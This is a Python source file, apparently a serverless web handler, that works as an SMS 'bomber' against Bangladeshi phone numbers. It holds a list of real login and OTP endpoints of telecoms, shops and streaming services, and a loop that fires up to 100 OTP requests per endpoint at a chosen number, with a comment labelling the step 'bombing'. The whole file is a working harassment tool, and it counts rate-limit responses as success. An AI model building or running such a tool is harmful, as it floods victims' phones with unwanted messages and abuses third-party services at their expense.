from http.server import BaseHTTPRequestHandler
import json
import requests
import random
import re
import urllib.parse

# ==================== API LIST ====================
APIS = [
    {
        "name": "DeepToPlay",
        "url": "https://api.deeptoplay.com/v2/auth/login",
        "method": "POST",
        "params": {"country": "BD", "platform": "web", "language": "en"},
        "data": {"number": "+88{full}"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Bikroy",
        "url": "https://bikroy.com/data/phone_number_login/verifications/phone_login",
        "method": "GET",
        "params": {"phone": "{full}"},
        "headers": {}
    },
    {
        "name": "Chorki",
        "url": "https://api-dynamic.chorki.com/v2/auth/login",
        "method": "POST",
        "params": {"country": "BD", "platform": "web", "language": "en"},
        "data": {"number": "+88{full}"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "BioscopeLive",
        "url": "https://api-dynamic.bioscopelive.com/v2/auth/login",
        "method": "POST",
        "params": {"country": "BD", "platform": "web", "language": "en"},
        "data": {"phone": "+88{full}"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "QuizGiri",
        "url": "https://developer.quizgiri.xyz/api/v2.0/send-otp",
        "method": "POST",
        "data": {"phone": "{without_leading_zero}", "country_code": "+880"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Meena Bazar",
        "url": "https://mbonlineapi.com/api/front/send/otp",
        "method": "POST",
        "data": {"CellPhone": "{full}", "type": "login"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Rang",
        "url": "https://api.rang-bd.com/api/auth/otp",
        "method": "POST",
        "data": {"phone": "{full}"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Bata",
        "url": "https://www.batabd.com/apps/ez/api/GenerateOtp",
        "method": "POST",
        "data": "StoreName=batabd.myshopify.com&EmailId=&MobileNo=0{without_leading_zero}&CountryCode=880&Token=0cAFcWeA5EPsHeSpW3%40.Z9LyEW__A081gB-y2gnI8aiGXAsuBnzcsXUvTRF012aPmcUOqDct0O0DLn2Af7NQs-0LiEbwRSgh4d6XaqxyQBP4hU66p6KawfYaeWDig2SWFjr_Jrc2W0BGmg3gloBE8HGhweYgb2ybByBdg3njXfY3owohro0v6TBDtO-CBd6sTaVk1UriYrsYP2fjv1KBgWMxie24f9wAzNaGY5mq97B-CwMHGYnVQA5f3ihcJcLKYBBhFvs-zQXUDfjnptaicI2UAm1_9tUh6e-j5oijrEYaaLW3-YP7RGTlWszauL68draRBsG6q6o7f8NDe-M1M0VGJu_fyp74FRgfPYIwDIDNQX3s9nNpbO8IgkMk4__eohbuCwkRX23l9PcQw5nyx8Xm6X4_ZbZUed1iXZLaGbDHII-Q5bvAmbq7KugK5NJ1Ke-VY3P5dTDIo5IqCUU9NEKEzoGnrQyNOSyBImn3cO-V5CLOuamdS4DRXVi9JP5eXgKrlmRtp4MkWKivn2Qa_rcnMdPbt8_A3v0JLiNnHWfk9BPyJoGcD9yrSVfTcy07igXKoy2FVaHz0UOof-wid0O5IWvNsIViKqX1KrRvXK7c2ZHjULEUEINt7XIP3Br0ydYyBSLKOB3NsOUBWwtcE8yT2a9lexJpamuDK6yPKl2QIQZolOf7Ui6m4fybk5cfWy76FxWW9hAgltm7W7Bwn4uynTQ32kFy-R_AFbc5l2eykEGPd47APfOnZb6qAbo9R5mmyZC6HLlIj9fIFtPsfeoVYibcH98VjWbteJnLOOTa2_6KbftAR-URTG0yI_bRB0PNUWQcnWEz1qEd3WRdjTVORqB3tRqSwTOtN7enjH953rLzS4HihIbDDx0MSq6BDUM_HMYJh98n5s_",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
    },
    {
        "name": "Grameenphone",
        "url": "https://weblogin.grameenphone.com/backend/api/v1/otp",
        "method": "POST",
        "data": {"msisdn": "{full}"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Banglalink",
        "url": "https://web-api.banglalink.net/api/v1/user/otp-login/request",
        "method": "POST",
        "data": {"mobile": "{full}"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Airtel",
        "url": "https://api.airtel.com.bd/api/v1.0/otp/generate",
        "method": "POST",
        "data": {"mobile": "880{without_leading_zero}"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Robi",
        "url": "https://api.robi.com.bd/api/v1.0/otp/generate",
        "method": "POST",
        "data": {"mobile": "880{without_leading_zero}"},
        "headers": {"Content-Type": "application/json"}
    }
]

# ==================== HELPER FUNCTIONS ====================
def validate_phone(phone):
    """Validate Bangladeshi phone number (11 digits starting with 01)"""
    digits = re.sub(r'\D', '', phone)
    if len(digits) == 11 and digits.startswith('01'):
        return {
            "full": digits,
            "without_leading_zero": digits[1:],
            "with_88": "+88" + digits,
            "with_880": "880" + digits[1:]
        }
    return None

def send_request(api, phone_formats):
    """Send a single request to the given API"""
    try:
        # Build URL with query parameters
        url = api["url"]
        params = {}
        if "params" in api:
            for k, v in api["params"].items():
                params[k] = v.format(**phone_formats) if isinstance(v, str) else v

        # Prepare body data
        json_data = None
        form_data = None
        if "data" in api:
            if isinstance(api["data"], dict):
                json_data = {}
                for k, v in api["data"].items():
                    json_data[k] = v.format(**phone_formats) if isinstance(v, str) else v
            elif isinstance(api["data"], str):
                form_data = api["data"].format(**phone_formats)

        headers = api.get("headers", {})

        # Make request
        if api["method"] == "GET":
            resp = requests.get(url, params=params, headers=headers, timeout=10)
        else:  # POST
            if json_data:
                resp = requests.post(url, params=params, json=json_data, headers=headers, timeout=10)
            elif form_data:
                resp = requests.post(url, params=params, data=form_data, headers=headers, timeout=10)
            else:
                resp = requests.post(url, params=params, headers=headers, timeout=10)

        return {
            "api": api["name"],
            "status": resp.status_code,
            "success": resp.status_code < 400 or resp.status_code == 429
        }
    except Exception as e:
        return {
            "api": api["name"],
            "status": "ERROR",
            "success": False,
            "error": str(e)
        }


# ==================== VERCEL HANDLER ====================
class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Parse query parameters
        parsed = urllib.parse.urlparse(self.path)
        query = urllib.parse.parse_qs(parsed.query)
        number = query.get('number', [None])[0]
        requests_str = query.get('requests', [None])[0]

        # Validate inputs
        if not number or not requests_str:
            self.send_response(400)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"error": "Missing number or requests parameter"}).encode())
            return

        try:
            req_count = int(requests_str)
            if req_count < 1 or req_count > 100:
                self.send_response(400)
                self.end_headers()
                self.wfile.write(json.dumps({"error": "requests must be between 1 and 100"}).encode())
                return
        except ValueError:
            self.send_response(400)
            self.end_headers()
            self.wfile.write(json.dumps({"error": "requests must be an integer"}).encode())
            return

        phone_formats = validate_phone(number)
        if not phone_formats:
            self.send_response(400)
            self.end_headers()
            self.wfile.write(json.dumps({"error": "Invalid Bangladeshi phone number. Must be 11 digits starting with 01"}).encode())
            return

        # Execute bombing
        total_apis = len(APIS)
        total_requests = total_apis * req_count
        success_count = 0
        fail_count = 0
        details = []

        for api in APIS:
            for i in range(req_count):
                result = send_request(api, phone_formats)
                if result["success"]:
                    success_count += 1
                else:
                    fail_count += 1
                details.append({
                    "api": result["api"],
                    "success": result["success"],
                    "status": result.get("status")
                })

        # Build response
        response = {
            "number": phone_formats["full"],
            "requests_per_api": req_count,
            "total_apis": total_apis,
            "total_requests": total_requests,
            "success": success_count,
            "failed": fail_count,
            "details": details
        }

        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(response, indent=2).encode())

    def do_POST(self):
        # Optionally handle POST if needed, but for simplicity we use GET
        self.do_GET()
